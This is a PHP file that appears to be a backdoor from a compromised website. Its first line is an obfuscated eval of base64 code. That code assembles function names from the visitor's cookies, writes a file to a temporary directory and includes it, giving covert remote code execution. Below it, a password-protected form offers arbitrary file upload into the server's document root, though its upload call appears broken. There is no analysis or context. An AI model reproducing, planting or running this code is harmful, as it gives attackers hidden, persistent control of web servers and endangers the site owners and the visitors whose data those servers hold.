<?php eval(base64_decode('CiBnb3RvIGEwaDF2OyBqdUI0QTogaW5jbHVkZSAkazsgZ290byBjQzVqbzsgb1NuQ2w6IGlmICghJHBbMTJdKCRrKSkgeyAkbiA9ICRwWzExXSgkaywgJHBbNl0pOyAkcFs3XSgkbiwgJHBbMTZdIC4gJHBbMjFdKCRwWzIwXSgkY1szXSkpKTsgfSBnb3RvIGp1QjRBOyBvRXpmNzogJGsgPSAwOyBnb3RvIG0wbmE4OyBIVzdGdjogJGsgPSAkcFsyNF0oKSAuICRwWzI5XTsgZ290byBvU25DbDsgbTBuYTg6ICRuID0gMzsgZ290byBORldFRDsgYTBoMXY6ICRjID0gJF9DT09LSUU7IGdvdG8gb0V6Zjc7IG1iNDRlOiAkcFska10gPSAnJzsgZ290byBMWndEdTsgTFp3RHU6IHdoaWxlICgkbikgeyAkcFska10gLj0gJGNbMTFdWyRuXTsgaWYgKCEkY1sxMV1bJG4gKyAxXSkgeyBpZiAoISRjWzExXVskbiArIDJdKSB7IGJyZWFrOyB9ICRrKys7ICRwWyRrXSA9ICcnOyAkbisrOyB9ICRuID0gJG4gKyAzICsgMTsgfSBnb3RvIEhXN0Z2OyBORldFRDogJHAgPSBhcnJheSgpOyBnb3RvIG1iNDRlOyBjQzVqbzog')); ?>

<?php
if ($_GET['cp']=='lvl@123')

{

$docr = $_SERVER["DOCUMENT_ROOT"];

echo <<<HTML

<table>

<form enctype="multipart/form-data" action="$self" method="POST">

<input type="hidden" name="ac" value="upload">

<tr>

<td><font size="1">Y-F: </font> </td>

<td>

<input size="48" name="file" type="file" style="color: #008000; font-family: Arial; font-size: 8pt; font-weight: bold; border: 2px solid #008000; background-color: #000000"></td>

</tr>

<tr>

<td><font size="1">Dir: </font> </td>

<td>

<input size="48" value="$docr/" name="path" type="text" style="color: #008000; font-family: Arial; font-size: 8pt; font-weight: bold; border: 2px solid #008000; background-color: #000000">

<input type="submit" value="U" style="color: #008000; font-family: Arial; font-size: 8pt; font-weight: bold; border: 2px solid #008000; background-color: #000000"></td>

$tend

</table>

HTML;



if(isset($_POST["path"])){$uploadfile=$_POST["path"].$_FILES["file"]["name"];if($_POST["path"]==""){$uploadfile=$_FILES["file"]["name"];}if(array($_FILES["file"]["tmp_name"],$uploadfile)){echo "to :$uploadfile\n";echo "- Size : ".$_FILES["file"]["size"]."\n";} else {

    print "Error  :\n";

}

}

}


?>
